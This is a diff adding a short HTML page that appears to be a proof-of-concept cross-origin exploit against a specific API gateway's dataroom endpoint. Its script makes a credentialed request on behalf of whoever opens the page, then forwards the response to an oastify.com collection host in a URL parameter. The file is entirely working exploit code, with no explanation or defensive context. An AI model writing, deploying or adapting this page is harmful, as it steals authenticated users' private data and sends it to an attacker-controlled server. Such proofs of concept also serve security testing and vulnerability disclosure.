@@ -1,0 +1,14 @@
+<html>
+<body>
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('GET','https://trove-preprod-api-gateway-9kwbykbe.uc.gateway.dev/trove/api/v1/datarooms/7af1c98c-0f87-4202-af1c-f929e07f943b/datasources',true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+    document.location='https://t0ufc0926npjfaxyjdpjrwxx0o6fu5iu.oastify.com/log?data='+encodeURIComponent(this.responseText);
+};
+</script>
+</body>
+</html>
